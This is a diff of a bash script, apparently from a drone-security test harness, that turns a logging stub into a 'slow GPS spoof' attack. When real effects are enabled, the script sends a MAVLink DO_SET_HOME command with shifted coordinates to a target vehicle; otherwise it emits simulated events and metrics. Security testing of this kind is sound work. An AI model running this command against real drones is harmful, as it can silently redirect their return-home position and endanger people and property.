@@ -1,27 +1,27 @@
 #!/usr/bin/env bash
+# Slow GPS spoof: gradual home shift via MAVLink command
 set -euo pipefail
-ATTACK_NAME="gps_slow_spoof"
-. "$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")"/.. && pwd)/sh_core/attack_std.shlib"
+BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+. "$BASE/00_env.sh"; . "$BASE/sh_core/lpc_bus.sh"; . "$BASE/sh_core/metrics.sh"
 
-: "${INTENSITY:=low}"
-: "${OFFSET_M:=auto}"
-: "${DRIFT_RATE:=auto}"
+: "${DLAT:=0.00005}"
+: "${DLON:=0.00005}"
+: "${DALT:=2}"
+: "${DUR:=1}"
 
-case "$INTENSITY" in
-  low)    OFFSET_M=${OFFSET_M/auto/0.1}; DRIFT_RATE=${DRIFT_RATE/auto/0.05} ;;
-  medium) OFFSET_M=${OFFSET_M/auto/0.3}; DRIFT_RATE=${DRIFT_RATE/auto/0.15} ;;
-  high)   OFFSET_M=${OFFSET_M/auto/0.8}; DRIFT_RATE=${DRIFT_RATE/auto/0.40} ;;
-esac
-
-_act(){
-  local lat_offset lon_offset alt_offset total_offset drift_acc
-  lat_offset=$(awk "BEGIN {srand(); print $OFFSET_M*(rand()-0.5)*2}")
-  lon_offset=$(awk "BEGIN {srand(); print $OFFSET_M*(rand()-0.5)*2}")
-  alt_offset=$(awk "BEGIN {srand(); print $OFFSET_M*0.1*(rand()-0.5)*2}")
-  total_offset=$(awk "BEGIN {print sqrt(($lat_offset)^2 + ($lon_offset)^2)}")
-  drift_acc=$(awk "BEGIN {srand(); print $DRIFT_RATE*(1 + rand()*0.5)}")
-  _log_bus "$ATTACK_NAME" "intensity=$INTENSITY" "lat_offset_m=$lat_offset" "lon_offset_m=$lon_offset" "alt_offset_m=$alt_offset" "total_offset_m=$total_offset" "drift_rate=$drift_acc"
-  return 0
+main(){
+  log "[gps_slow_spoof] mode=$LPC_MODE dlat=$DLAT dlon=$DLON dalt=$DALT dur=$DUR"
+  local before after; before=$(obs_snapshot "$DVD_C_GCS" "$DVD_TARGET_IF")
+  if [ "${ALLOW_REAL_EFFECTS:-0}" -eq 1 ]; then
+    # MAV_CMD_DO_SET_HOME (179): set specific location
+    python3 "$BASE/interface/mavlink_cmd.py" --host "$DVD_MAVLINK_HOST" --port "$DVD_MAVLINK_PORT" \
+      cmd-long 179 0 0 0 0 "$DLAT" "$DLON" "$DALT" || true
+    bus_emit "gps" "action=home_shift dlat=$DLAT dlon=$DLON dalt=$DALT target=${DVD_MAVLINK_HOST}:${DVD_MAVLINK_PORT}"
+  else
+    bus_emit "gps" "action=home_shift_sim dlat=$DLAT dlon=$DLON dalt=$DALT"
+    effect_emit "delay_ms=3 jitter_ms=1"
+  fi
+  sleep "$DUR"
+  after=$(obs_snapshot "$DVD_C_GCS" "$DVD_TARGET_IF"); delta_emit "$before" "$after" "gps_obs"
 }
-
-run_lpc_loop _act "${DUR:-0}"
+main "$@"
